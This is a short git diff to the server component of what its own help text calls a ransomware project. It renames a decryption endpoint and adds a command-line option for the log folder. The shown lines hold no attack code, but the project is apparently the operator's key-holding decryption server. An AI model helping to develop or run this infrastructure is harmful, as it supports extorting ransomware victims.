@@ -26,7 +26,7 @@ class BFLYServerApp:
         # router instance for specific endpoints
         self.router = Router(name=__title__)
         self.router.add_endpoint('/', 'index', method="GET", handler=self.api.index)
-        self.router.add_endpoint(endpoint='/decrypt/', endpoint_name='route_decrypt', method="POST", handler=self.api.route_decrypt)
+        self.router.add_endpoint(endpoint='/decryption/', endpoint_name='route_decrypt', method="POST", handler=self.api.route_decrypt)
 
     def run(self, host='0.0.0.0', port=None, debug=None):
         """ runs the BFLYServerApp application on given port
@@ -55,13 +55,15 @@ def main():
     # argument for the SPrivateRSA.pem file
     parser.add_argument('-k', '--key', type=str, help='Private Key from the Server for the Decryption (Corresponds to the embedded Server Public Key in the Ransomware)', required=True)
     # argument for the current version
+    parser.add_argument('-l', '--log', type=str, help='Logging folder for the Application. Default: /var/log/bflyServerApp', default='/var/log/bflyServerApp')
+    # argument for the current version
     parser.add_argument('-v', '--version', action='version', version=__version__, help='Shows the current version')
 
     # parse all arguments
     args = parser.parse_args()
 
     # set up logger instance
-    logger = Logger(name=__title__, level='info', log_folder='/var/log/bflyServerApp')
+    logger = Logger(name=__title__, level='info', log_folder=args.log)
     logger.info("Start Application bflyServerApp with version {}".format(__version__))
 
     # create application instance
